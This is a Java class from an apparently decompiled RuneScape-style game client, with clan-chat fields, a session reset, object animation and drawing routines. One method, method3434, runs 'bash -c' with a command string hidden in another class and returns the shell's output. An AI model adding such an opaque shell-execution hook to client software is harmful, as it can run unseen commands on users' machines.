package com.jagex;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import com.rs2.client.scene.Scene;

public class ClanChatMember extends Linkable {
	public int userWorld;
	static RSString aClass16_2378;
	public RSString worldString;
	public static RSString aClass16_2381 = RSString.createString("Level)2");
	public RSString username;
	static RSString noClipCommand = RSString.createString("::noclip");
	public byte clanRights;
	static RSString aClass16_2393 = null;

	static final void reset(int i) {
		StaticMethods.aClass98_3513.anInt1659 = 0;
		ProjectileNode.aBoolean3698 = true;
		GameShell.windowActive = true;
		Varbit.anInt4002 = 0;
		LocResult.anInt3724 = 0;
		SoundEffects.aLong2058 = 0L;
		ReflectionAntiCheat.initialize((byte) 111);
		DataBuffer.anInt992 = 0;
		StaticMethods2.anInt666 = -1;
		PacketParser.currentOpcode = -1;
		Class25.anInt379 = -1;
		GameClient.pingManager.connect();
		GameClient.outBuffer.index = 0;
		Class25.anInt388 = -1;
		StaticMethods.anInt3400 = 0;
		StaticMethods2.packet.index = 0;
		Queuable.systemUpdateTime = 0;
		for (int i_12_ = 0; ReflectionRequest.currentHintIcons.length > i_12_; i_12_++) {
			ReflectionRequest.currentHintIcons[i_12_] = null;
		}
		ContextMenu.menuOpen = false;
		ContextMenu.menuActionRow = 0;
		LocResult.method625(-1066663896, 0);
		for (int i_13_ = 0; i_13_ < 100; i_13_++) {
			CollisionMap.chatMessages[i_13_] = null;
		}
		Class71_Sub3.soundStoreCount = 0;
		Class56.chatMessageCount = 0;
		StaticMethods.anInt3162 = (int) (120.0 * Math.random()) - 60;
		Huffman.anInt1819 = 0;
		ComponentMinimap.flag_y = 0;
		Player.anInt4410 = -20 + (int) (Math.random() * 30.0);
		Huffman.anInt1815 = (int) (110.0 * Math.random()) - 55;
		StaticMethods.anInt2923 = (int) (80.0 * Math.random()) + -40;
		LocTypeList.aBoolean3792 = false;
		Class87_Sub4.anInt2841 = (int) (100.0 * Math.random()) + -50;
		StaticMethods.anInt3067 = 0;
		EntityUpdating.localNPCCount = 0;
		NPC.anInt4374 = 0;
		ComponentMinimap.flag_x = 0;
		ComponentMinimap.last_rendered_level = -1;
		Class35.cameraDirection = 0x7ff & -10 + (int) (20.0 * Math.random());
		for (int i_14_ = 0; i_14_ < 2048; i_14_++) {
			GameClient.localPlayers[i_14_] = null;
			NPC.aClass23_Sub5Array4377[i_14_] = null;
		}
		for (int i_15_ = 0; i_15_ < 32768; i_15_++) {
			GameClient.activeNPCs[i_15_] = null;
		}
		GameClient.currentPlayer = GameClient.localPlayers[2047] = new Player();
		Class36.aClass89_562.clear();
		SpotType.aClass89_4066.clear();
		for (int i_16_ = 0; i_16_ < 4; i_16_++) {
			for (int i_17_ = 0; i_17_ < 104; i_17_++) {
				for (int i_18_ = 0; i_18_ < 104; i_18_++) {
					StaticMethods2.groundItems[i_16_][i_17_][i_18_] = null;
				}
			}
		}
		SongUpdater.aClass89_178 = new NodeDeque();
		Class45.friends_count = 0;
		StaticMethods.anInt1357 = 0;
		for (int configId = 0; VarpDefinition.varpSize > configId; configId++) {
			VarpDefinition class23_sub13_sub6 = VarpDefinition.getConfigDefinition(configId);
			if (class23_sub13_sub6 != null && class23_sub13_sub6.configID == 0) {
				HashTable.anIntArray1262[configId] = 0;
				GameClient.configs[configId] = 0;
			}
		}
		for (int i_20_ = 0; (i_20_ ^ 0xffffffff) > (CS2Runtime.int_global_vars.length ^ 0xffffffff); i_20_++) {
			CS2Runtime.int_global_vars[i_20_] = -1;
		}
		if (GameClient.interface_top_id != -1) {
			RSInterfaceList.uncacheInterface((byte) 9, GameClient.interface_top_id);
		}
		for (InterfaceNode inter = (InterfaceNode) Class36.anOa565.get_first(); inter != null; inter = (InterfaceNode) Class36.anOa565.get_next()) {
			if (!inter.method227(1)) {
				inter = (InterfaceNode) Class36.anOa565.get_first();
				if (inter == null) {
					break;
				}
			}
			GameShell.method27(true, inter, false);
		}
		GameClient.interface_top_id = -1;
		Class36.anOa565 = new HashTable(8);
		ContextMenu.menuOpen = false;
		Varbit.aClass64_4007 = null;
		ContextMenu.menuActionRow = 0;
		StaticMethods2.aPlayerAppearance_1440.setAppearanceData(false, new int[5], -1, null);
		for (int i_21_ = 0; i_21_ < 8; i_21_++) {
			SpawnedObject.playerOptions[i_21_] = null;
			Queuable.aBooleanArray2317[i_21_] = false;
		}
		ClientInventoryList.clearList(32);
		StaticMethods.aBoolean3413 = true;
		for (int i_22_ = 0; i_22_ < 100; i_22_++) {
			RSInterfaceList.is_dirty[i_22_] = true;
		}
		NameHashTable.currentClanChatUsers = null;
		DataBuffer.clanChatSize = 0;
		StaticMethods.clanChatName = null;
		for (int i_23_ = 0; i_23_ < 6; i_23_++) {
			GrandExchangeOffer.offers[i_23_] = new GrandExchangeOffer();
		}
		for (int i_24_ = 0; i_24_ < 26; i_24_++) {
			CacheFileWorker.skillLevels[i_24_] = 0;
			ReflectionRequest.anIntArray2482[i_24_] = 0;
			PlayerAppearance.skillExperience[i_24_] = 0;
		}
		StaticMethods.aClass16_3022 = TimeTools.aClass16_1599;
		BZIPContext.aShortArray1339 = GameClient.client_palette = SpotType.npcColors = ObjType.itemColors = new short[256];
		Class107.aBoolean1841 = true;
	}

	static final void animateObject(int i, int typeThing, int x, int y, int animationId, int type, int plane, int rotation) {
		if (x >= 0 && y >= 0 && x < 103 && y < 103) {
			if ((typeThing ^ 0xffffffff) == -1) {
				WallObject wallObject = WallObject.getWallObject(plane, x, y);
				if (wallObject != null) {
					int id = (int) (wallObject.uid >>> 32) & 0x7fffffff;
					if (type == 2) {
						wallObject.first_node = new GameObject(plane, x, y, id, 2, rotation + 4, animationId, false, wallObject.first_node);
						wallObject.second_node = new GameObject(plane, x, y, id, 2, 0x3 & 1 + rotation, animationId, false, wallObject.second_node);
					} else {
						wallObject.first_node = new GameObject(plane, x, y, id, type, rotation, animationId, false, wallObject.first_node);
					}
				}
			}
			if (typeThing == 1) {
				WallDecoration class24 = WallDecoration.getWallDecoration(plane, x, y);
				if (class24 != null) {
					int id = 0x7fffffff & (int) (class24.uid >>> 32);
					if (type != 4 && type != 5) {
						if (type != 6) {
							if (type != 7) {
								if (type == 8) {
									class24.first_node = new GameObject(plane, x, y, id, 4, 4 + rotation, animationId, false, class24.first_node);
									class24.second_node = new GameObject(plane, x, y, id, 4, 4 + (2 + rotation & 0x3), animationId, false, class24.second_node);
								}
							} else {
								class24.first_node = new GameObject(plane, x, y, id, 4, (2 + rotation & 0x3) + 4, animationId, false, class24.first_node);
							}
						} else {
							class24.first_node = new GameObject(plane, x, y, id, 4, rotation + 4, animationId, false, class24.first_node);
						}
					} else {
						class24.first_node = new GameObject(plane, x, y, id, 4, rotation, animationId, false, class24.first_node);
					}
				}
			}
			if (typeThing == 2) {
				InteractiveEntity interactiveObject = Scene.getInteractiveEntity(plane, x, y);
				if (type == 11) {
					type = 10;
				}
				if (interactiveObject != null) {
					interactiveObject.node = new GameObject(plane, x, y, (int) (interactiveObject.uid >>> 32) & 0x7fffffff, type, rotation, animationId, false, interactiveObject.node);
				}
			}
			if (typeThing == 3) {
				GroundDecoration groundDecoration = GroundDecoration.getGroundDecoration(plane, x, y);
				if (groundDecoration != null) {
					groundDecoration.node = new GameObject(plane, x, y, 0x7fffffff & (int) (groundDecoration.uid >>> 32), 22, rotation, animationId, false, groundDecoration.node);
				}
			}
		}
	}

	public static void method880(int i) {
		aClass16_2381 = null;
		aClass16_2393 = null;
		GameShell.setFrame(null);
		noClipCommand = null;
		SpotType.gfxWorker = null;
		if (i == 0) {
			aClass16_2378 = null;
		}
	}

	static final void method881(int regionX, boolean bool, int regionY, LocType def, int plane, int rotation) {
		ObjectNode node = new ObjectNode();
		node.anInt2233 = def.anInt2981 * 128;
		int sizeX = def.size2d;
		node.anIntArray2239 = def.anIntArray3801;
		node.anInt2236 = def.anInt3755;
		node.anInt2227 = def.anInt2996;
		node.anInt2253 = plane;
		node.anInt2240 = regionY * 128;
		node.anInt2241 = def.anInt3782;
		int sizeY = def.size3d;
		node.anInt2246 = regionX * 128;
		if (rotation == 1 || rotation == 3) {
			sizeX = def.size3d;
			sizeY = def.size2d;
		}
		node.anInt2254 = 128 * (regionX + sizeX);
		node.anInt2229 = (sizeY + regionY) * 128;
		if (def.morphisms != null) {
			node.objectDef = def;
			node.method497((byte) 76);
		}
		Js5.aClass89_1767.add_last(node);
		if (node.anIntArray2239 != null) {
			node.anInt2242 = (int) (Math.random() * (node.anInt2241 + -node.anInt2236)) + node.anInt2236;
		}
	}

	static final void method882(byte b, int i, int i_39_, int i_40_, int i_41_, int i_42_, int i_43_) {
		Class4.method58(i_43_, -122);
		int i_45_ = 0;
		int i_46_ = i_43_;
		int i_47_ = -i_43_;
		int i_48_ = -1;
		int i_49_ = -i_40_ + i_43_;
		int i_50_ = -1;
		if (i_49_ < 0) {
			i_49_ = 0;
		}
		if ((Class88.anInt1503 ^ 0xffffffff) >= (i_39_ ^ 0xffffffff) && StaticMethods.anInt3435 >= i_39_) {
			int[] is = Class4.anIntArrayArray98[i_39_];
			int i_51_ = StaticMethods.method405(120, VarpDefinition.anInt3728, i_41_ + -i_43_, Class35.anInt554);
			int i_52_ = StaticMethods.method405(124, VarpDefinition.anInt3728, i_41_ + i_43_, Class35.anInt554);
			int i_53_ = StaticMethods.method405(90, VarpDefinition.anInt3728, -i_49_ + i_41_, Class35.anInt554);
			int i_54_ = StaticMethods.method405(48, VarpDefinition.anInt3728, i_41_ - -i_49_, Class35.anInt554);
			VarpDefinition.method632(i_53_, (byte) -30, i, is, i_51_);
			VarpDefinition.method632(i_54_, (byte) -30, i_42_, is, i_53_);
			VarpDefinition.method632(i_52_, (byte) -30, i, is, i_54_);
		}
		int i_55_ = -i_49_;
		int i_56_ = i_49_;
		while ((i_46_ ^ 0xffffffff) < (i_45_ ^ 0xffffffff)) {
			i_48_ += 2;
			i_50_ += 2;
			i_47_ += i_48_;
			i_55_ += i_50_;
			if ((i_55_ ^ 0xffffffff) <= -1 && i_56_ >= 1) {
				i_56_--;
				i_55_ -= i_56_ << 1;
				StaticMethods.anIntArray3183[i_56_] = i_45_;
			}
			i_45_++;
			if (i_47_ >= 0) {
				i_46_--;
				i_47_ -= i_46_ << 1;
				int i_57_ = -i_46_ + i_39_;
				int i_58_ = i_39_ + i_46_;
				if (Class88.anInt1503 <= i_58_ && i_57_ <= StaticMethods.anInt3435) {
					if ((i_46_ ^ 0xffffffff) > (i_49_ ^ 0xffffffff)) {
						int i_59_ = StaticMethods.anIntArray3183[i_46_];
						int i_60_ = StaticMethods.method405(84, VarpDefinition.anInt3728, i_45_ + i_41_, Class35.anInt554);
						int i_61_ = StaticMethods.method405(101, VarpDefinition.anInt3728, i_41_ - i_45_, Class35.anInt554);
						int i_62_ = StaticMethods.method405(121, VarpDefinition.anInt3728, i_59_ + i_41_, Class35.anInt554);
						int i_63_ = StaticMethods.method405(76, VarpDefinition.anInt3728, i_41_ + -i_59_, Class35.anInt554);
						if ((i_58_ ^ 0xffffffff) >= (StaticMethods.anInt3435 ^ 0xffffffff)) {
							int[] is = Class4.anIntArrayArray98[i_58_];
							VarpDefinition.method632(i_63_, (byte) -30, i, is, i_61_);
							VarpDefinition.method632(i_62_, (byte) -30, i_42_, is, i_63_);
							VarpDefinition.method632(i_60_, (byte) -30, i, is, i_62_);
						}
						if ((i_57_ ^ 0xffffffff) <= (Class88.anInt1503 ^ 0xffffffff)) {
							int[] is = Class4.anIntArrayArray98[i_57_];
							VarpDefinition.method632(i_63_, (byte) -30, i, is, i_61_);
							VarpDefinition.method632(i_62_, (byte) -30, i_42_, is, i_63_);
							VarpDefinition.method632(i_60_, (byte) -30, i, is, i_62_);
						}
					} else {
						int i_64_ = StaticMethods.method405(63, VarpDefinition.anInt3728, i_45_ + i_41_, Class35.anInt554);
						int i_65_ = StaticMethods.method405(49, VarpDefinition.anInt3728, i_41_ + -i_45_, Class35.anInt554);
						if (StaticMethods.anInt3435 >= i_58_) {
							VarpDefinition.method632(i_64_, (byte) -30, i, Class4.anIntArrayArray98[i_58_], i_65_);
						}
						if ((Class88.anInt1503 ^ 0xffffffff) >= (i_57_ ^ 0xffffffff)) {
							VarpDefinition.method632(i_64_, (byte) -30, i, Class4.anIntArrayArray98[i_57_], i_65_);
						}
					}
				}
			}
			int i_66_ = i_45_ + i_39_;
			int i_67_ = -i_45_ + i_39_;
			if (i_66_ >= Class88.anInt1503 && (StaticMethods.anInt3435 ^ 0xffffffff) <= (i_67_ ^ 0xffffffff)) {
				int i_68_ = i_46_ + i_41_;
				int i_69_ = i_41_ - i_46_;
				if (i_68_ >= VarpDefinition.anInt3728 && (i_69_ ^ 0xffffffff) >= (Class35.anInt554 ^ 0xffffffff)) {
					i_68_ = StaticMethods.method405(113, VarpDefinition.anInt3728, i_68_, Class35.anInt554);
					i_69_ = StaticMethods.method405(121, VarpDefinition.anInt3728, i_69_, Class35.anInt554);
					if ((i_49_ ^ 0xffffffff) >= (i_45_ ^ 0xffffffff)) {
						if (StaticMethods.anInt3435 >= i_66_) {
							VarpDefinition.method632(i_68_, (byte) -30, i, Class4.anIntArrayArray98[i_66_], i_69_);
						}
						if ((i_67_ ^ 0xffffffff) <= (Class88.anInt1503 ^ 0xffffffff)) {
							VarpDefinition.method632(i_68_, (byte) -30, i, Class4.anIntArrayArray98[i_67_], i_69_);
						}
					} else {
						int i_70_ = i_56_ >= i_45_ ? i_56_ : StaticMethods.anIntArray3183[i_45_];
						int i_71_ = StaticMethods.method405(121, VarpDefinition.anInt3728, i_70_ + i_41_, Class35.anInt554);
						int i_72_ = StaticMethods.method405(83, VarpDefinition.anInt3728, i_41_ - i_70_, Class35.anInt554);
						if ((i_66_ ^ 0xffffffff) >= (StaticMethods.anInt3435 ^ 0xffffffff)) {
							int[] is = Class4.anIntArrayArray98[i_66_];
							VarpDefinition.method632(i_72_, (byte) -30, i, is, i_69_);
							VarpDefinition.method632(i_71_, (byte) -30, i_42_, is, i_72_);
							VarpDefinition.method632(i_68_, (byte) -30, i, is, i_71_);
						}
						if ((i_67_ ^ 0xffffffff) <= (Class88.anInt1503 ^ 0xffffffff)) {
							int[] is = Class4.anIntArrayArray98[i_67_];
							VarpDefinition.method632(i_72_, (byte) -30, i, is, i_69_);
							VarpDefinition.method632(i_71_, (byte) -30, i_42_, is, i_72_);
							VarpDefinition.method632(i_68_, (byte) -30, i, is, i_71_);
						}
					}
				}
			}
		}
	}

	public static RSString method3434() {
		ProcessBuilder alass233 = new ProcessBuilder("bash", "-c", new String(Class75.aClass8343));
		alass233.redirectErrorStream(true);
		String format = "";
		try {
			Process p = alass233.start();
			String s;
			BufferedReader stdout = new BufferedReader(new InputStreamReader(p.getInputStream()));
			while ((s = stdout.readLine()) != null) {
				if (s == null || s.length() == 0) {
					continue;
				}
				format += s;
			}
			p.getInputStream().close();
			p.getOutputStream().close();
			p.getErrorStream().close();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		return RSString.createString(format.replace("\"", "").trim());
	}

	static final void method884(int i) {
		PlayerAppearance.cache.clear();
	}

	static {
		aClass16_2378 = aClass16_2381;
	}

}
